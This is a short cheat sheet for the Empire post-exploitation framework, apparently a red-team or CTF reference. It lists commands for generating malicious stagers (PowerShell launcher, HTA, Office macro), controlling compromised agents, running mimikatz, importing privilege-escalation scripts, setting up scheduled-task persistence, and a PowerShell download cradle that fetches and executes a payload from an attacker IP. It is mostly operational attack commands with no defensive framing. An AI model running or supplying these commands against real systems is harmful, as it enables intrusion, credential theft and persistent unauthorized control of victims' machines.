# Empire CheatSheet

## Common usage
- help or ?
- main : to return to main context
- creds : for credential database
- searchmodule : basic string searches
- listeners : list listeners and switch to listenre context
- usestager : create agent command or file
- agents : list agents and switch to agent context
- usemodule : task agent with a job
- info : display context settings
- set Setting : define settings

## Stager

```
listeners
uselistener http
execute
```

multi/launcher

```
usestager multi/launcher
set Listener http
set SafeChecks False
set 0
set OutFile /opt/Empire/Download/launcher.ps1
generate
```


windows/hta

```
usestager windows/hta
set Listener http
set OutFile /opt/Empire/Downloads/empire.hta
generate
```

windows/macro

```
usestager windnows/macro
set Listener http
set Proxy none
set OutFile /opt/Empire/downloads/empire.bas
generate
```

## Agents

- interact agentname
- rename agentname
- list
- upload file
- download file
- scriptimport /opt/ps/script.ps1
- scriptcmd funcname
- mimikatz
- shell

### Scripts import

```
scriptimport /opt/ps/Sherlock.ps1
scriptcmd Find-AllVulns 
```

```
scriptimport /opt/ps/Invoke-MKW.ps1
scriptcmd Invoke-MKZ
```

### Interact with agent

- sc : screenshot
- shell ls (powershell command only)

## Debugging

start Empire with '*-debug*' flag

```
cat /opt/Empire/empire.log
```

Download cradle:

```
powershell -command "$Z='http://10.10.x.x:3000/launcher.ps1'; IEX (New-Object Net.webclient).Downloadstring($Z)"
```

Clear settings: 

```
/opt/Empire/setup/reset.sh
```

## Persistence

```
usemodule persistence/userland/schtasks
set Listener http
set IdleTime 2
set Agent autorun
run
[>] Module is not opsec safe, run? [y/N] : y
```

## Privesc

```
interact agent
usemodule privesc/powerup/allchecks
```

```
usemodule privesc/gpp
```

Bypass UAC